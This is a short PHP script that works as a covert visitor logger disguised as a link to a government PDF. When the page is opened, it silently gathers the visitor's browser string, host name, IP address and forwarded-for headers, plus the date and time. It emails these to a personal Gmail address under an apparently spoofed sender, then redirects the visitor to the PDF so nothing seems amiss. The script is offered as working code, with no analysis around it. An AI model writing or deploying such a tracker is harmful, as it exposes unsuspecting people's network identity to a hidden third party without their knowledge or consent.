<?php 
$navegador=$_SERVER['HTTP_USER_AGENT'];
$host=$_SERVER['REMOTE_HOST'];
$ip=$_SERVER['REMOTE_ADDR'];
$ip2=$_SERVER['HTTP_CLIENT_IP'];
$ip3=$_SERVER['HTTP_X_FORWARDED_FOR'];
$fecha=date("Y-m-d");
$hora=date("H:i:s");

$para      = 'ingfcoalv@gmail.com';
$titulo    = 'Nueva conexion';
$mensaje   = 'Hola te mando la nueva conexion<br />Navegador: '.$navegador.'<br />host: '.$host.'<br />
IP: '.$ip.'<br />
IP2: '.$ip2.'<br />
IP3: '.$ip3.'<br />
fecha: '.$fecha.'<br />
hora: '.$hora.'<br />';
$cabeceras = 'From: anon@tcs.mx' . "\r\n" .
    'Reply-To: ingfcoalv@gmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($para, $titulo, $mensaje, $cabeceras);

header("Location: http://difgdl.gob.mx/images/transparencia/resolución_92.pdf");


?>